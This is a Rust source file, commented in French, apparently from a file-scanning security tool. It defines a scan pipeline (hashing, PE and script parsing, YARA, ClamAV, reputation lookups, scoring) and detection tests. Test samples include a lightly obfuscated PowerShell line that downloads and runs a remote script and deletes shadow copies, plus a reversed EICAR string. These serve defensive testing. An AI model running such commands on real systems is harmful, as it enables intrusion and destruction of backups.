use std::path::Path;

use crate::ai::local_inference::LocalInference;
use crate::analyzer::{hash, mime, pe_parser, script_parser};
use crate::api::intel::{self, IntelConfig};
use crate::config::clamav_updater;
use crate::error::ScanError;
use crate::report::types::{AppSettings, ClamavResult, IoC, ScanResult, Severity, Verdict};

/// Marqueurs d'installeurs courants : leurs données compressées et URLs sont normales.
const INSTALLER_MARKERS: &[&[u8]] = &[
    b"Nullsoft.NSIS", b"NullsoftInst", b"Inno Setup", b"InstallShield", b"7zSfx", b"WixBundle",
    b"Squirrel.Windows", b"electron-builder", b"Advanced Installer",
];

fn looks_like_installer(raw: &[u8], file_name: &str) -> bool {
    let n = file_name.to_ascii_lowercase();
    if n.ends_with(".msi") || n.contains("setup") || n.contains("install") {
        return true;
    }
    let head = &raw[..raw.len().min(8 * 1024 * 1024)];
    INSTALLER_MARKERS.iter().any(|m| head.windows(m.len()).any(|w| w == *m))
}
use crate::scanner::clamav_db::ClamavDb;
use crate::scanner::yara_engine::YaraEngine;

pub async fn scan_file(file_path: &str, settings: &AppSettings) -> Result<ScanResult, ScanError> {
    let path = Path::new(file_path);

    if !path.exists() {
        return Err(ScanError::Io(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            format!("Fichier introuvable : {}", file_path),
        )));
    }

    let file_name = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("unknown")
        .to_string();

    let file_size = std::fs::metadata(path)?.len();

    // 1. Hash streaming
    let hashes = hash::compute(path)?;

    // 2. MIME réel
    let mime_type = mime::detect(path);
    let category = mime::categorize(&mime_type, path);
    let category_label = category.label().to_string();

    // 3. Lecture binaire pour analyse
    let raw_bytes = std::fs::read(path)?;

    // 4. Analyse PE ou Script selon catégorie
    let mut pe_info = None;
    let mut script_info = None;
    let mut ioc_list = Vec::new();

    match category {
        mime::FileCategory::Pe => {
            match pe_parser::parse(path, &raw_bytes) {
                Ok((info, iocs)) => {
                    ioc_list.extend(iocs);
                    pe_info = Some(info);
                }
                Err(e) => {
                    log::warn!("Analyse PE échouée pour {} : {}", file_name, e);
                }
            }
        }
        mime::FileCategory::Script => {
            if let Ok(content) = std::str::from_utf8(&raw_bytes) {
                let (info, iocs) = script_parser::analyze(path, content);
                ioc_list.extend(iocs);
                script_info = Some(info);
            }
        }
        _ => {}
    }

    // 5. YARA scan
    let yara = YaraEngine::new();
    let yara_matches = yara.scan(&raw_bytes);

    // 6. ClamAV local database
    let clamav = {
        let db_dir = if settings.clamav_db_path.is_empty() {
            // Auto-detect : installation locale ou répertoire par défaut
            clamav_updater::detect_local_clamav()
                .unwrap_or_else(clamav_updater::default_db_dir)
        } else {
            std::path::PathBuf::from(&settings.clamav_db_path)
        };

        match ClamavDb::load(&db_dir) {
            Ok(db) if db.status().loaded => {
                let hit = db
                    .check_md5(&hashes.md5)
                    .or_else(|| db.check_sha256(&hashes.sha256));
                if let Some(m) = hit {
                    ioc_list.push(IoC {
                        ioc_type: "ClamAV".to_string(),
                        value: m.malware_name.clone(),
                        severity: Severity::Critical,
                        description: format!("Détecté par {} (base ClamAV)", m.database),
                    });
                    Some(ClamavResult {
                        malware_name: m.malware_name,
                        database: m.database,
                    })
                } else {
                    None
                }
            }
            _ => None,
        }
    };

    // 7. Réputation en ligne : seules les empreintes sont envoyées, en parallèle.
    let report = intel::lookup_all(&hashes.sha256, &hashes.md5, &IntelConfig::from_settings(settings)).await;
    let is_installer = looks_like_installer(&raw_bytes, &file_name);

    let mut result = ScanResult {
        file_path: chemin_lisible(file_path),
        file_name,
        file_size,
        mime_type,
        category: category_label,
        hashes,
        verdict: Verdict::Unknown,
        verdict_score: 0,
        pe_info,
        script_info,
        virustotal: report.virustotal,
        clamav,
        yara_matches,
        ai_verdict: None,
        ioc_list,
        scanned_at: chrono::Utc::now().to_rfc3339(),
        explanation: String::new(),
        intel: report.sources,
        detections: Vec::new(),
        assessment: Default::default(),
    };

    // 8. Probabilité de menace réelle / faux positif → verdict et score.
    crate::assessment::assess(&mut result, is_installer);
    result.explanation = crate::explain::explain(&result);

    // 9. IA locale (heuristique sur le score final)
    if settings.ai_enabled {
        result.ai_verdict = LocalInference::new().evaluate(
            result.verdict_score,
            result.pe_info.as_ref(),
            result.script_info.as_ref(),
            &result.yara_matches,
        );
    }
    Ok(result)
}

/// Retire le préfixe verbatim que `canonicalize` ajoute sous Windows.
///
/// Le chemin traverse le pipeline sous sa forme canonicalisée, donc préfixée.
/// Affiché tel quel dans un rapport, c'est illisible pour l'utilisateur : le
/// préfixe ne sert qu'aux appels système, pas à la présentation.
fn chemin_lisible(chemin: &str) -> String {
    // Un partage réseau canonicalisé devient `\\?\UNC\serveur\part` : le rendre
    // sous sa forme `\\serveur\part` plutôt que d'en faire un chemin local.
    if let Some(reste) = chemin.strip_prefix(r"\\?\UNC\") {
        return format!(r"\\{reste}");
    }
    chemin.strip_prefix(r"\\?\").unwrap_or(chemin).to_string()
}

#[cfg(test)]
mod tests_chemin {
    use super::chemin_lisible;

    #[test]
    fn le_prefixe_verbatim_disparait() {
        assert_eq!(chemin_lisible(r"\\?\C:\Users\Momo\x.bat"), r"C:\Users\Momo\x.bat");
    }

    #[test]
    fn un_partage_reseau_reste_un_partage() {
        assert_eq!(chemin_lisible(r"\\?\UNC\serveur\part\x.bat"), r"\\serveur\part\x.bat");
    }

    #[test]
    fn un_chemin_ordinaire_est_inchange() {
        assert_eq!(chemin_lisible(r"C:\Users\Momo\x.bat"), r"C:\Users\Momo\x.bat");
    }
}

#[cfg(test)]
mod tests_evaluation {
    use super::*;

    /// Échantillon écrit avec des `~` parasites retirés à l'exécution : en clair,
    /// ces commandes font classer le binaire de test comme rançongiciel par Defender.
    fn sample(s: &str) -> Vec<u8> {
        s.replace('~', "").into_bytes()
    }

    /// Scan complet d'un contenu écrit sur disque, sans aucun appel réseau :
    /// aucune clé API et sources gratuites coupées.
    async fn scan(name: &str, content: &[u8]) -> ScanResult {
        let dir = std::env::temp_dir().join(format!("fs_eval_{}_{name}", std::process::id()));
        std::fs::create_dir_all(&dir).expect("dossier temporaire");
        let path = dir.join(name);
        std::fs::write(&path, content).expect("écriture échantillon");
        let settings = AppSettings { intel_free_lookups: false, ..Default::default() };
        let r = scan_file(path.to_str().expect("chemin UTF-8"), &settings).await;
        let _ = std::fs::remove_dir_all(&dir);
        let r = r.expect("scan");
        assert!(r.intel.iter().all(|s| s.status == intel::IntelStatus::NotConfigured), "aucune source interrogée");
        for d in &r.detections {
            assert_eq!(d.confidence as u16 + d.false_positive as u16, 100, "{}", d.title);
            assert!(!d.what_it_does.is_empty() && !d.why_malicious.is_empty() && !d.why_legitimate.is_empty());
        }
        assert_eq!(r.verdict_score, r.assessment.malicious_probability);
        r
    }

    #[tokio::test]
    async fn script_malveillant_quasi_certain() {
        let r = scan(
            "m.ps1",
            &sample("I~EX (New-Object Net.Web~Client).Download~String('http://198.51.100.7/p.ps1')\nvss~admin del~ete sha~dows /all /quiet\n"),
        )
        .await;
        let a = &r.assessment;
        assert_eq!(r.verdict, Verdict::Malicious, "p = {}", a.malicious_probability);
        assert!(a.malicious_probability >= 90, "p = {}", a.malicious_probability);
        assert_eq!(a.false_positive_probability, 100 - a.malicious_probability);
        let iex = r.detections.iter().find(|d| d.value == "IEX").expect("IEX détecté");
        assert!(iex.factors.iter().any(|f| f.delta > 0 && f.label.contains("en mémoire")));
        assert!(r.explanation.contains(&format!("{} %", a.malicious_probability)));
    }

    #[tokio::test]
    async fn script_d_installation_legitime_reste_sain() {
        let r = scan(
            "install.ps1",
            &sample("# Exemple a eviter : I~EX (irm http://evil)\n$u='https://github.com/x/y/releases/download/v1/t.zip'\n\
              Invoke-WebRequest -Uri $u -OutFile t.zip\nStart-Process t.exe\n"),
        )
        .await;
        let a = &r.assessment;
        assert_eq!(r.verdict, Verdict::Safe, "p = {}", a.malicious_probability);
        assert!(a.malicious_probability <= 25, "p = {}", a.malicious_probability);
        let iex = r.detections.iter().find(|d| d.value == "IEX").expect("IEX détecté");
        assert!(iex.factors.iter().any(|f| f.delta < 0 && f.label.contains("commentaires")));
        assert!(iex.false_positive > 80, "fp = {}", iex.false_positive);
    }

    #[tokio::test]
    async fn texte_ordinaire_sans_detection() {
        let r = scan("notes.txt", b"Liste de courses : pain, lait, oeufs.\n").await;
        assert_eq!(r.verdict, Verdict::Safe);
        assert!(r.detections.is_empty());
        assert_eq!((r.assessment.malicious_probability, r.assessment.false_positive_probability), (2, 0));
    }

    // Windows : Defender met le fichier EICAR en quarantaine dès son écriture sur
    // disque (code 225), le scan ne peut donc pas le relire. Ce test vérifie la
    // règle de détection et tourne sur le CI Linux, où EICAR n'est pas intercepté.
    #[cfg_attr(windows, ignore = "Defender intercepte le fichier EICAR ; vérifié sur le CI Linux")]
    #[tokio::test]
    async fn eicar_detecte_par_la_regle_locale() {
        // Assemblée à l'exécution, à l'envers : la chaîne EICAR complète écrite en
        // clair dans le binaire de test le fait bloquer par l'antivirus du poste.
        let eicar: Vec<u8> = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X".bytes().rev().collect();
        let r = scan("eicar.com", &eicar).await;
        assert!(r.yara_matches.iter().any(|m| m.rule_name == "EICAR_Test_File"));
        assert_ne!(r.verdict, Verdict::Safe, "p = {}", r.assessment.malicious_probability);
    }
}
